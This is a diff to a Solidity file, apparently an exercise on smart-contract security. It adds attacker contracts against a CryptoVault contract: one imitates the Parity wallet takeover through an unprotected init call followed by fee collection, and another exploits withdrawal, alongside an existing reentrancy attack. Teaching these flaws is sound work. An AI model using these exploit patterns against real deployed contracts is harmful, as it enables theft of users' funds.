@@ -106,7 +106,7 @@ contract CryptoVault {
     }
 }
 
-contract Attack1 {
+contract Attack1 { //unexpected callbacks
 
     CryptoVault cv;
 
@@ -137,3 +137,38 @@ contract Attack1 {
     }
 }
 
+contract Attack2 { // Parity wallet
+
+    CryptoVault cv;
+
+    constructor(address _cv) public{
+        cv = CryptoVault(payable (_cv));
+    }
+
+    function attack(address ai) external payable {
+        ai.call(abi.encodeWithSignature("init(address)",this));
+        ai.call(abi.encodeWithSignature("collectFees()"));
+        cv.collectFees();
+    }
+
+    function getbalance() public view returns(uint){
+        return address (this).balance;
+    }
+
+}
+
+contract Attack3 {
+
+    CryptoVault cv;
+
+    constructor(address _cv) public{
+        cv = CryptoVault(payable (_cv));
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1);
+        cv.withdraw(100);
+    }
+
+
+}
